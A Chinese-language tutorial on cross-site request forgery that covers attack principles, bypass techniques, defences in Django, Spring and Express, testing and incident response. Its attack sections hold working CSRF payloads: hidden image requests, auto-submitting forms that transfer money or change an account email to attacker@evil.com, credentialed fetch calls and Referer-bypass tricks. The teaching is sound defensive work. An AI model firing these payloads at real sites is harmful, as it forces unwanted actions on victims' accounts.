# CSRF（跨站请求伪造)

## 1. CSRF攻击原理

### 1.1 基本概念

CSRF（Cross-Site Request Forgery）是一种诱使受害者在已登录的Web应用程序上执行非预期操作的攻击。攻击者利用用户的登录状态发起恶意请求。

### 1.2 产生原因

- **浏览器自动携带认证信息**（Cookie、Session）

- **关键操作缺乏二次确认**

- **请求参数可预测**

- **缺乏有效的CSRF令牌**

### 1.3 攻击流程

`用户登录信任网站 → 保持登录状态 → 访问恶意网站 → 自动发起伪造请求 → 执行非预期操作`

## 2. CSRF分类

### 2.1 按请求方式分类

#### 2.1.1 GET型CSRF

```html
<!-- 通过图片标签发起GET请求 -->
<img src="http://bank.com/transfer?to=attacker&amount=1000" width="0" height="0">
```

#### 2.1.2 POST型CSRF

```html
<!-- 自动提交表单 -->
<form id="csrf" action="http://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### 2.2 按触发方式分类

#### 2.2.1 自动触发型

- 页面加载时自动执行

- 无需用户交互

#### 2.2.2 诱导触发型

- 需要用户点击链接或按钮

- 通过社交工程诱导

## 3. CSRF攻击示例

### 3.1 基础攻击载荷

#### 3.1.1 图片标签GET请求

```html
<img src="http://example.com/delete-account" style="display:none">
```

#### 3.1.2 自动提交表单

```html
<form action="http://example.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

#### 3.1.3 AJAX请求

```javascript
<script>
fetch('http://example.com/transfer', {
  method: 'POST',
  credentials: 'include',
  body: 'to=attacker&amount=1000'
});
</script>
```

### 3.2 高级攻击技术

#### 3.2.1 JSON CSRF

```html
<script>
// 利用Content-Type检查不严格
fetch('http://api.example.com/update', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'text/plain'},
  body: '{"role":"admin"}'
});
</script>
```

#### 3.2.2 文件上传CSRF

```html
<form action="http://example.com/upload-avatar" method="POST" enctype="multipart/form-data">
  <input type="file" name="avatar">
</form>
<script>
// 自动选择文件并提交（需要用户交互）
</script>
```

## 4. 绕过技术

### 4.1 Referer检查绕过

#### 4.1.1 空Referer

```html
<!-- 从HTTPS跳到HTTP可能丢失Referer -->
<meta name="referrer" content="no-referrer">
```

<!-- 从HTTPS跳到HTTP可能丢失Referer -->

<meta name="referrer" content="no-referrer">

#### 4.1.2 同源Referer

```html
<!-- 利用开放重定向 -->
<a href="http://example.com/redirect?url=http://example.com/transfer">Click</a>
```

### 4.2 Token验证绕过

#### 4.2.1 Token泄漏

- 通过XSS窃取Token

- 通过JSONP接口泄漏

#### 4.2.2 Token重复使用

- 固定Token

- 会话期内Token不变

#### 4.2.3 预测Token

- 弱随机数生成器

- 时间可预测

### 4.3 同源策略绕过

#### 4.3.1 CORS配置错误

```javascript
// 服务端配置Access-Control-Allow-Origin: *
fetch('http://vulnerable.com/api/user', {
 method: 'POST',
 credentials: 'include'
});
```

#### 4.3.2 JSONP端点滥用

```html
<script src="http://api.example.com/user?callback=stealData"></script>
```

## 5. 防御措施

### 5.1 CSRF Token

#### 5.1.1 同步器Token模式

```html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="random123">
  <input type="text" name="amount">
  <button type="submit">Transfer</button>
</form>
```

<!-- 表单中包含Token -->

#### 5.1.2 服务端验证

```python
from flask import session, request, abort
import secrets

def generate_csrf_token():
 if 'csrf_token' not in session:
 session['csrf_token'] = secrets.token_hex(32)
 return session['csrf_token']

def validate_csrf_token():
 token = request.form.get('csrf_token')
 if not token or token != session.get('csrf_token'):
 abort(403, 'CSRF token validation failed')
```

#### 5.1.3 双重Cookie提交

```javascript
// 客户端设置自定义Header
fetch('/api/transfer', {
 method: 'POST',
 headers: {
 'X-CSRF-Token': getCookie('csrf_token')
 },
 body: JSON.stringify(data)
});
```

### 5.2 SameSite Cookie属性

#### 5.2.1 Strict模式

```http
Set-Cookie: sessionId=abc123; SameSite=Strict; Secure
```

#### 5.2.2 Lax模式（推荐）

```http
Set-Cookie: sessionId=abc123; SameSite=Lax; Secure
```

#### 5.2.3 现代浏览器默认

- Chrome 80+ 默认SameSite=Lax

- 需要显式设置SameSite=None; Secure用于跨站

### 5.3 验证码和重新认证

#### 5.3.1 关键操作验证

```python
def sensitive_operation(request):
 if not verify_captcha(request.POST.get('captcha')):
 return error_response('Captcha verification failed')
    # 执行敏感操作
  perform_operation()
```

#### 5.3.2 密码重新认证

```python
def change_password(request):
    if not verify_password(request.user, request.POST.get('current_password')):
        return error_response('Current password is incorrect')

    # 更新密码
    update_password()
```

### 5.4 自定义Header验证

#### 5.4.1 自定义请求头

```javascript
// 添加自定义Header
$.ajax({
  url: '/api/sensitive-action',
  headers: {
    'X-Requested-With': 'XMLHttpRequest',
    'X-Custom-Token': 'custom-value'
  }
});
```

#### 5.4.2 服务端验证

```python
def check_custom_headers(request):
 if request.headers.get('X-Requested-With') != 'XMLHttpRequest':
 abort(403, 'Invalid request')
```

## 6. 框架内置防护

### 6.1 Django CSRF防护

```python
# settings.py
MIDDLEWARE = [
    'django.middleware.csrf.CsrfViewMiddleware',
]

# 模板中使用
<form method="post">
  {% csrf_token %}
  <!-- 表单内容 -->
</form>

# 视图中验证
from django.views.decorators.csrf import csrf_protect

@csrf_protect
def sensitive_view(request):
    # 处理请求
```

### 6.2 Spring Security CSRF防护

```java
// 配置CSRF保护
@Configuration
@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter {

    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .csrf()
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse());
    }
}

// 表单中包含Token
<input type="hidden" name="${_csrf.parameterName}" value="${_csrf.token}">
```

### 6.3 Express.js CSRF防护

```javascript
const csrf = require('csurf');
const cookieParser = require('cookie-parser');

app.use(cookieParser());
app.use(csrf({ cookie: true }));

// 获取Token
app.get('/form', (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

// 表单中使用
<form action="/process" method="POST">
  <input type="hidden" name="_csrf" value="<%= csrfToken %>">
</form>
```

<form action="/process" method="POST">
  <input type="hidden" name="_csrf" value="<%= csrfToken %>">
</form>

## 7. 高级防护策略

### 7.1 请求来源验证

#### 7.1.1 Origin Header检查

```python
def check_origin(request):
    allowed_origins = ['https://example.com', 'https://app.example.com']
    origin = request.headers.get('Origin')

    if origin and origin not in allowed_origins:
        abort(403, 'Invalid Origin')
```

#### 7.1.2 Referer Header检查

```python
def check_referer(request):
    allowed_domains = ['example.com', 'app.example.com']
    referer = request.headers.get('Referer')

    if not referer:
        abort(403, 'Referer header missing')

    referer_domain = urlparse(referer).netloc
    if referer_domain not in allowed_domains:
        abort(403, 'Invalid Referer')
```

### 7.2 用户交互验证

#### 7.2.1 二次确认

```javascript
function confirmAction(message) {
 return new Promise((resolve) => {
 if (confirm(message)) {
 resolve(true);
 } else {
 resolve(false);
 }
 });
}

// 使用
confirmAction('Are you sure you want to delete your account?')
 .then(confirmed => {
 if (confirmed) {
 deleteAccount();
 }
 });
```

#### 7.2.2 操作日志和通知

```python
def log_sensitive_operation(user, action, ip_address):
    log_entry = SecurityLog(
        user=user,
        action=action,
        ip_address=ip_address,
        timestamp=datetime.now()
    )
    log_entry.save()

    # 发送通知邮件
    send_security_notification(user, action)
```

## 8. 检测和测试

### 8.1 手动测试方法

#### 8.1.1 测试Payload生成

```html
<html>
<body>
  <form id="csrf-form" action="https://target.com/sensitive-action" method="POST">
    <input type="hidden" name="param1" value="malicious_value">
  </form>
  <script>document.getElementById('csrf-form').submit();</script>
</body>
</html>
```

<!-- 基础CSRF测试页面 -->

#### 8.1.2 浏览器测试工具

- **Burp Suite CSRF PoC Generator**

- **OWASP ZAP**

- **浏览器开发者工具**

### 8.2 自动化测试

#### 8.2.1 安全扫描工具

- **Burp Suite Professional**

- **Acunetix**

- **Nessus**

#### 8.2.2 自定义测试脚本

```python
import requests

def test_csrf_protection(target_url, cookies):
    # 测试缺少CSRF Token的情况
    response = requests.post(target_url, cookies=cookies, data={})

    if response.status_code == 200:
        print("Potential CSRF vulnerability detected")
    else:
        print("CSRF protection appears to be working")
```

## 9. 最佳实践

### 9.1 开发阶段

1. **对所有状态变更请求实施CSRF防护**

2. **使用框架内置的CSRF保护**

3. **实施深度防御策略**

4. **进行安全代码审查**

### 9.2 安全编码规范

#### 9.2.1 安全的API设计

```python
class SecureAPIView(APIView):
    @method_decorator(csrf_protect)
    def post(self, request):
        # 验证CSRF Token
        if not self.validate_csrf(request):
            return Response({'error': 'CSRF validation failed'}, status=403)

        # 处理业务逻辑
        return Response({'success': True})
```

#### 9.2.2 安全的Cookie设置

```python
def set_secure_cookie(response, name, value):
 response.set_cookie(
 name,
 value,
 secure=True,
 httponly=True,
 samesite='Lax',
 max_age=3600
 )
```

### 9.3 运维配置

1. **配置安全的CORS策略**

2. **实施严格的Referrer-Policy**

3. **监控异常请求模式**

4. **定期安全审计**

## 10. 应急响应

### 10.1 检测到CSRF攻击

1. **立即撤销受影响的操作**

2. **分析攻击向量和影响范围**

3. **通知受影响用户**

4. **增强防护措施**

### 10.2 修复流程

```python
# 1. 识别漏洞点
# 未受保护的敏感操作端点

# 2. 实施修复
@app.route('/sensitive-action', methods=['POST'])
@csrf_protect
def sensitive_action():
    # 受保护的操作
    pass

# 3. 验证修复
# 测试CSRF防护是否生效
```

### 10.3 后续改进

1. **加强CSRF Token的随机性和时效性**

2. **实施更严格的同源策略**

3. **增强安全监控和告警**

4. **进行安全意识培训**

## 11. 现代Web应用的特殊考虑

### 11.1 SPA（单页应用）防护

```javascript
// 在SPA中管理CSRF Token
class CSRFManager {
    constructor() {
        this.token = null;
    }

    async fetchToken() {
        const response = await fetch('/api/csrf-token', {
            credentials: 'include'
        });
        const data = await response.json();
        this.token = data.csrfToken;
    }

    async makeRequest(url, options = {}) {
        if (!this.token) {
            await this.fetchToken();
        }

        options.headers = {
            ...options.headers,
            'X-CSRF-Token': this.token
        };

        return fetch(url, options);
    }
}
```

### 11.2 移动应用API防护

```python
# 使用基于签名的请求验证
def verify_request_signature(request):
    api_key = request.headers.get('X-API-Key')
    signature = request.headers.get('X-Signature')
    timestamp = request.headers.get('X-Timestamp')

    expected_signature = generate_signature(api_key, timestamp, request.body)

    if signature != expected_signature:
        abort(403, 'Invalid request signature')
```

### 11.3 GraphQL API防护

```javascript
// GraphQL CSRF防护
const { createServer } = require('http');
const { ApolloServer } = require('apollo-server-express');
const csrf = require('csurf');

const csrfProtection = csrf({ cookie: true });

const server = new ApolloServer({
 context: ({ req, res }) => {
 // 验证CSRF Token
 if (req.method === 'POST') {
 csrfProtection(req, res, (err) => {
 if (err) throw new Error('CSRF validation failed');
 });
 }
 return { user: req.user };
 }
});
```